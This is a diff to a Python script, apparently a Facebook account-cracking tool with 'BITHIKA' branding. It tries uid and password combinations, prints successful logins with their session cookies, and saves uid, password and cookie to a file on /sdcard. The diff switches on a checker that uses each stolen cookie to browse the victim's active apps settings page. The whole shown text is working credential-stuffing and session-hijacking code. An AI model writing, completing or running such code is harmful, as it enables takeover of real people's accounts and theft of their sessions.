@@ -1,6 +1,6 @@
 #__________________| IMPORT |__________________#
 from os import path
-import requests,random,uuid,string,hashlib,json
+import requests,bs4,random,uuid,string,hashlib,json
 from os import path
 from urllib.request import urlopen
 import os,base64,zlib,pip,urllib,urllib3
@@ -8,6 +8,7 @@ import platform,math,smtplib
 import platform
 import smtplib
 import math
+import bs4
 import os,base64,zlib,pip,urllib
 def clear():
         os.system('clear')
@@ -1151,7 +1152,7 @@ def rndm3(uid,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        #cek_apk(coki)
+                                        cek_apk(coki)
                                         open('/sdcard/BITHIKA-RANDOM-M3-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
@@ -1171,7 +1172,7 @@ def rndm3(uid,passlist):
  
 #----------------[ ID-CHECKER ]--------------------------#
 
-"""def #cek_apk(coki):
+def cek_apk(coki):
 	session = requests.Session()
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
@@ -1190,7 +1191,7 @@ def rndm3(uid,passlist):
 		for i in range(len(game)):
 			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
 	except AttributeError:
-		print ("\r    %s \033[0mcookie invalid"%(M))"""
+		print ("\r    %s \033[0mcookie invalid"%(M))
 
 #-------------------------close-----------------------------
 if __name__ == '__main__':
